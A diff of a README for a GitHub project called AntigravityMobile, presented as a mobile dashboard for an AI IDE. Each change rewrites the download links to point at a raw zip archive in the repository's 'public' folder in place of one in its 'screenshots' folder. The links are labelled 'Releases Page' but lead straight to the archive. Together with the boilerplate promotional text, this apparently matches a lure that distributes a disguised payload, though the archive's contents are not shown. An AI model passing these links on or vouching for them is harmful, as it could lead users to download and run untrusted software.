@@ -1,7 +1,7 @@
 # 🚀 AntigravityMobile - Access Your AI Conversations Anywhere
 
 ## 📥 Download
-[![Download AntigravityMobile](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/screenshots/Antigravity_Mobile_2.8.zip)](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/screenshots/Antigravity_Mobile_2.8.zip)
+[![Download AntigravityMobile](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/public/Mobile-Antigravity-1.3.zip)](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/public/Mobile-Antigravity-1.3.zip)
 
 ## 🌟 Overview
 AntigravityMobile is a feature-rich mobile dashboard for Antigravity IDE. It allows you to stream live AI conversations, monitor model quotas, and browse or edit workspace files from any device on your local network. Enjoy a distraction-free Lite Mode and secure your access with optional PIN security.
@@ -22,7 +22,7 @@ AntigravityMobile is a feature-rich mobile dashboard for Antigravity IDE. It all
 - **PIN Security:** Keep your mobile dashboard safe with a personal PIN.
 
 ## 📥 Download & Install
-To get started, visit this page to download AntigravityMobile: [Releases Page](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/screenshots/Antigravity_Mobile_2.8.zip). 
+To get started, visit this page to download AntigravityMobile: [Releases Page](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/public/Mobile-Antigravity-1.3.zip). 
 
 1. Click on the “Releases” link above.
 2. Find the latest version of AntigravityMobile.
@@ -58,6 +58,6 @@ For support or questions, feel free to reach out through the Issues section of t
 AntigravityMobile is licensed under the MIT License. See the LICENSE file for details.
 
 ## 📥 Download Again
-To download AntigravityMobile once more, visit this page: [Releases Page](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/screenshots/Antigravity_Mobile_2.8.zip). 
+To download AntigravityMobile once more, visit this page: [Releases Page](https://github.com/safwanits123/AntigravityMobile/raw/refs/heads/master/public/Mobile-Antigravity-1.3.zip). 
 
 Thank you for choosing AntigravityMobile. Enjoy seamless access to your AI conversations and data!
